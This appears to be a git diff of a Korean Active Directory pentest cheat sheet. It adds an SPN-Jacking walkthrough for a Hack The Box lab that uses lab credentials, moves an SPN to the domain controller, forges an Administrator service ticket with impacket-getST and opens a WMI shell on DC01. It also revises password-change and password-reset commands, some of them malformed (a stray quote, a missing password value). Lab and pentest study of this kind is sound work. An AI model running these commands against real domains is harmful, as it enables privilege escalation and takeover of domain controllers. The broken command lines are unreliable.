@@ -275,8 +275,29 @@ certipy find -vulnerable -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <IP>
 ## Step 3. ADCS 취약점 exploit
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 ```
-## 4.2. SPN-
+## 4.2. SPN-Jacking
+https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/
+```
+### 아래 명령어는 HTB의 pirate 를 예시로 작성
+### 가정 1 : a.white_adm -- 제약 위임 --> WEB01
+### 가정 2 : a.white_adm -> (WriteSPN) --> WEB01
+### 가정 3 : a.white_adm -> (WriteSPN) --> DC01
+## Step 1. WEB01의 SPN 확인
+bloodyAD --host ${htb_ip} -d pirate.htb -u 'a.white_adm' -p 'gotRoot!2' get object 'WEB01$' --attr servicePrincipalName
 
+## Step 2. SPN 속성 하나 삭제 (HTTP/WEB01.pirate.htb)
+addspn -u 'pirate.htb\a.white_adm' -p 'gotRoot!2' -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r ${htb_ip}
+
+## Step 3. DC01에 SPN 추가
+addspn -u 'pirate.htb\a.white_adm' -p 'gotRoot!2' -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' ${htb_ip}
+
+## Step 4. SPN 속성 값으로 TGS 발급 + Service Name Substitution - DC SPN으로 변경
+impacket-getST -dc-ip ${htb_ip} -spn 'http/WEB01.pirate.htb' -impersonate Administrator 'pirate.htb/a.white_adm:gotRoot!2' -altservice 'cifs/DC01.pirate.htb'
+
+## Step 5. DC 접근
+export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
+impacket-wmiexec -k -no-pass 'DC01.pirate.htb'
+```
 
 # 99. Tool CheatSheet
 ## BloodyAD
@@ -324,8 +345,11 @@ impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request -users
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
 impacket-GetUserSPNs <DOMAIN>/<USERNAME> -k -no-pass -dc-ip <IP> -request
 
-## 패스워드 변경
-impacket-changepasswd <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP> -newpass '<NEW_PASSWORD>' -p rpc-samr
+## 내 패스워드 변경
+impacket-changepasswd <DOMAIN>/<USERNAME>:'@<IP> -newpass '<NEW_PASSWORD>'
+
+## 타 사용자 패스워드 변경
+impacket-changepasswd <DOMAIN>/<TARGET_USERNAME>:'<PASSWORD>'@<IP> -newpass '<NEW_PASSWORD>' -altuser <USERNAME> -altpasswd -k -no-pass -reset
 
 ## TGS 발급
 impacket-getST -spn '<SPN>' -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'
